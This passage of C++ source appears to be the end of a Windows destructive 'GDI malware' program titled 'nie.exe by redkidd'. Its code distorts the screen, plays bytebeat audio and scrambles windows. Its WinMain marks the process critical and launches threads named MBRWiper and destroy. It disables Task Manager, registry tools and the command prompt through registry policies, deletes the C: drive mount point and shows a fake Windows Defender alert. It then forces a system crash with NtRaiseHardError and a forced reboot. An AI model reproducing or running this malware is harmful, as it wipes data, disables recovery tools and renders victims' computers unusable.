
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		StretchBlt(mdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCINVERT);
		StretchBlt(mdc, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, SRCAND);

		UpdateLayeredWindow(hwnd, hdc, lpt, size, mdc, lpt, color, 0, 1);
		ReleaseDC(0, hdc);
		//Sleep(10);
	}
	return 0x00;
}
DWORD WINAPI shader7(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCINVERT);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)(225);

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbRed += fx;
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCINVERT);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI sines(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
			angle += M_PI / 40;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}
DWORD WINAPI shader8(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	POINT point[3];
	INT increment = 10 + rand() % 40;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx1 = (4 * i) + ((4 * i) * (logbf(sin(x / M_PI * 14)))) + (4 * i) + ((4 * i) * logbf(tan((y + i)) / 320));
				int fx2 = (int)((4 * i) + ((4 * i) * sin(x / 32.0)) + (4 * i) + ((4 * i) * sin(y / 24.0)));
				int fxCombined = cbrt(fx1 + fx2);

				rgbquad[index].rgbRed += fxCombined + 16;
				rgbquad[index].rgbGreen += fxCombined + 32;
				rgbquad[index].rgbBlue += fxCombined + 64;
			}
		}
		if (rand() % 10 >= 6)
		{
			point[0].x = increment; point[0].y = -increment;
			point[1].x = screenWidth + increment; point[1].y = increment;
			point[2].x = -increment; point[2].y = screenHeight - increment;
		}
		else
		{
			point[0].x = -increment; point[0].y = increment;
			point[1].x = screenWidth - increment; point[1].y = -increment;
			point[2].x = increment; point[2].y = screenHeight + increment;
		}
		i++;
		PlgBlt(hdcCopy, point, hdcCopy, 0, 0, screenWidth, screenHeight, 0, 0, 0);
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}
BOOL CALLBACK MoveWindowCallback(HWND hwnd, LPARAM lParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	if (!IsWindowVisible(hwnd) || IsIconic(hwnd)) {
		return TRUE;
	}
	int newX = rand() % screenWidth;
	int newY = rand() % screenHeight;
	int newWidth = (rand() % (screenWidth / 2)) + 100;
	int newHeight = (rand() % (screenHeight / 2)) + 100;
	SetWindowPos(hwnd, HWND_TOP, newX, newY, newWidth, newHeight, SWP_NOACTIVATE | SWP_NOREDRAW);
	return TRUE;
}
DWORD WINAPI window(LPVOID lpParam) {
	while (1) {
		EnumWindows(MoveWindowCallback, 0);
		Sleep(5);
	}
	return 0;
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((5 - t * t >> 9 - t) - t) / 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() { //credits to UltraDasher965, but I modified it
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 1) * (t ^ 1638 ? 6 : 5) * (3 + (3 & t >> (t * 409 ? 7 : 14))) * (3 ^ t >> 9) ^ t >> 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t * (t >> 9 ^ 30) ^ 6) ^ ~t >> 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * log(t & t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t) * ((t >> 5) * ((t >> 6))));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(log(t) * ((t >> 5) * ((t >> 6))));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * log(t >> 6 ^ t >> 2));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * cos(t >> 1 & t >> 8 ^ 123 & t >> 3));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * tan(t >> 7 ^ t >> 8 ^ 3 + t >> 3));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
void reg_add( //credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
	HKEY HKey,
	LPCWSTR Subkey,
	LPCWSTR ValueName,
	unsigned long Type,
	unsigned int Value
)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;


	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);

	RegCloseKey(hKey);
	return;
}
DWORD WINAPI fakemessage(LPVOID lpParam) {
	MessageBox(NULL, L"Threat detected! Click OK to scan now.", L"Windows Defender", MB_ICONWARNING);
	return 0;
}
DWORD WINAPI nicetry(LPVOID lpParam) {
	MessageBox(NULL, L"nice try", L"nice try", MB_ICONERROR);
	return 0;
}
DWORD WINAPI nicetryThread(LPVOID lpvd) {
	while (1) {
		CreateThread(0, 0, nicetry, 0, 0, 0);
		Sleep(rand() % 100);
	}
	return 1;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"click yes to begin i do not give one fuck about your data", L"nie.exe by redkidd", MB_YESNO | MB_ICONEXCLAMATION | MB_SYSTEMMODAL) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		ProcessIsCritical();
		CreateThread(0, 0, MBRWiper, 0, 0, 0);
		CreateThread(0, 0, notaskbar, 0, 0, 0);
		CreateThread(0, 0, destroy, 0, 0, 0);
		reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
		reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
		reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
		HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
		HANDLE thread1dot1 = CreateThread(0, 0, fuckingMess, 0, 0, 0);
		HANDLE thread1dot2 = CreateThread(0, 0, WindowsCorruptionPayload, 0, 0, 0);
		HANDLE thread1dot3 = CreateThread(0, 0, textz, 0, 0, 0);
		sound1();
		Sleep(30000);
		TerminateThread(thread1, 0);
		CloseHandle(thread1);
		TerminateThread(thread1dot1, 0);
		CloseHandle(thread1dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
		HANDLE thread2dot1 = CreateThread(0, 0, kindaComplex, 0, 0, 0);
		sound2();
		Sleep(30000);
		TerminateThread(thread2, 0);
		CloseHandle(thread2);
		TerminateThread(thread2dot1, 0);
		CloseHandle(thread2dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
		HANDLE thread3dot1 = CreateThread(0, 0, shake, 0, 0, 0);
		sound3();
		Sleep(30000);
		TerminateThread(thread3, 0);
		CloseHandle(thread3);
		TerminateThread(thread3dot1, 0);
		CloseHandle(thread3dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
		HANDLE thread4dot1 = CreateThread(0, 0, layered2, 0, 0, 0);
		sound4();
		Sleep(30000);
		TerminateThread(thread4, 0);
		CloseHandle(thread4);
		TerminateThread(thread4dot1, 0);
		CloseHandle(thread4dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
		HANDLE thread5dot1 = CreateThread(0, 0, blocks, 0, 0, 0);
		HANDLE thread5dot2 = CreateThread(0, 0, triangle, 0, 0, 0);
		HANDLE thread5dot3 = CreateThread(0, 0, opener, 0, 0, 0);
		sound5();
		Sleep(30000);
		TerminateThread(thread5, 0);
		CloseHandle(thread5);
		InvalidateRect(0, 0, 0);
		HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
		HANDLE thread6dot1 = CreateThread(0, 0, woah, 0, 0, 0);
		sound6();
		Sleep(30000);
		TerminateThread(thread6, 0);
		CloseHandle(thread6);
		TerminateThread(thread6dot1, 0);
		CloseHandle(thread6dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread7 = CreateThread(0, 0, layered3, 0, 0, 0);
		sound7();
		Sleep(30000);
		TerminateThread(thread7, 0);
		CloseHandle(thread7);
		InvalidateRect(0, 0, 0);
		HANDLE thread8 = CreateThread(0, 0, shader7, 0, 0, 0);
		HANDLE thread8dot1 = CreateThread(0, 0, sines, 0, 0, 0);
		sound8();
		Sleep(30000);
		TerminateThread(thread8, 0);
		CloseHandle(thread8);
		TerminateThread(thread8dot1, 0);
		CloseHandle(thread8dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread9 = CreateThread(0, 0, shader8, 0, 0, 0);
		sound9();
		Sleep(30000);
		TerminateThread(thread9, 0);
		CloseHandle(thread9);
		TerminateThread(thread1dot2, 0);
		CloseHandle(thread1dot2);
		TerminateThread(thread1dot3, 0);
		CloseHandle(thread1dot3);
		TerminateThread(thread5dot3, 0);
		CloseHandle(thread5dot3);
		TerminateThread(thread5dot2, 0);
		CloseHandle(thread5dot2);
		TerminateThread(thread5dot1, 0);
		CloseHandle(thread5dot1);
		InvalidateRect(0, 0, 0);
		DeleteVolumeMountPointA("C:\\");
		CreateThread(0, 0, fakemessage, 0, 0, 0);
		Sleep(10000);
		CreateThread(0, 0, window, 0, 0, 0);
		CreateThread(0, 0, nicetryThread, 0, 0, 0);
		Sleep(5000);
		BOOLEAN bl;
		DWORD response;
		NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
		RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
		RtlAdjustPrivilege(19, 1, 0, &bl);
		NtRaiseHardError(0xC0000001 + random() % 0x38e, 0, 0, 0, 6, &response);
		// If the computer is still running, do it the normal way
		HANDLE token;
		TOKEN_PRIVILEGES privileges;

		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
		privileges.PrivilegeCount = 1;
		privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

		// The actual restart
		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
		return 0;
	}
}